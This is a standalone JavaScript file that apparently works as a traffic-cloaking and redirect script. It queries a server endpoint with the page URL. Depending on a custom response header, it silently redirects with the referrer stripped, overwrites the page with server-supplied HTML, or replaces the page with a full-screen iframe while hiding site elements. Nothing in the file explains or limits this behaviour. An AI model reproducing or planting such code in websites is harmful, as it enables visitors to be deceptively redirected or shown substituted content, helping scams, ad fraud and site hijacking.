(function () {
    // Get domain from URL
    var url = window.location.href;
    var domain = window.location.hostname;
    var uri = url;

    // Create XHR request
    var xhr = new XMLHttpRequest();
    xhr.open("GET", "/js/jsprocessing.php?uri=" + encodeURIComponent(uri), true);
    xhr.setRequestHeader("X-Requested-With", "XMLHttpRequest");
    
    // Handle response
    xhr.onreadystatechange = function () {
        if (xhr.readyState !== 4) {
            return;
        }

        if (xhr.status !== 200) {
            console.log('Status Error: ', xhr.statusText);
            return;
        }

        var action = xhr.getResponseHeader("YWBAction");
        if (action === null || action === undefined) {
            console.log('No action header received');
            return;
        }

        switch (action) {
            case "none":
                console.log('You are not allowed to go futher!');
                return;
                break;
            case "redirect":
                var loc = xhr.getResponseHeader("YWBLocation");
                //console.log(loc);
                document.open();
                document.write('<html><head>');
                document.write('<meta name="referrer" content="never" />');
                document.write('<meta http-equiv="refresh" content="0; url=' + loc + '" />');
                document.write('</head></html>');
                document.close();
                break;
            case "replace":
                document.open();
                var respText = '';
                if (!xhr.responseText.includes('<base'))
                    respText = xhr.responseText.replace('<head>', '<head><base href="/' + domain + '"/>');
                else
                    respText = xhr.responseText;
                document.write(respText);
                document.close();
                break;
            case "iframe":
                var respText = '';
                if (!xhr.responseText.includes('<base'))
                    respText = xhr.responseText.replace('<head>', '<head><base href="/' + domain + '"/>');
                else
                    respText = xhr.responseText;
                showIframe(respText);
                break;
        }
    };
    xhr.send();
})();

function showIframe(html) {
    function hideElementDelayed(selector) {
        let interval = setInterval(function () {
            let element = document.querySelector(selector);
            if (element) {
                element.innerHTML = '';
                clearInterval(interval);
            }
        }, 820);
    }

    function appendElement(element) {
        document.body.innerHTML = '';
        document.body.style.margin = '0';
        document.body.style.padding = '0';
        document.body.style.border = '0';
        document.body.style.height = '100%';
        document.body.style.background = 'rgba(0,0,0,0)';
        document.querySelector('html').style.background = 'rgba(0,0,0,0)';
        document.body.appendChild(element);
        hideElementDelayed('#gtranslate_wrapper .switcher');
        hideElementDelayed('.ak-master-sales-pop');
        hideElementDelayed('.sticky');
    }

    let container = document.createElement('div');
    let iframe = document.createElement('iframe');
    let base = document.createElement('base');
    iframe.setAttribute('srcdoc', html);
    iframe.style.border = '0';
    iframe.style.margin = '0';
    iframe.style.padding = '0 auto';
    iframe.style.width = '100%';
    iframe.style.height = '100vh';
    iframe.style.overflow = 'hidden';

    container.style.border = '0';
    container.style.padding = '0';
    container.style.margin = '0 auto';
    container.style.width = '100%';
    container.style.height = '100vh';
    container.appendChild(iframe);

    if (document.body) {
        appendElement(container);
    } else {
        document.addEventListener('DOMContentLoaded', function () {
            appendElement(container);
        });
    }
}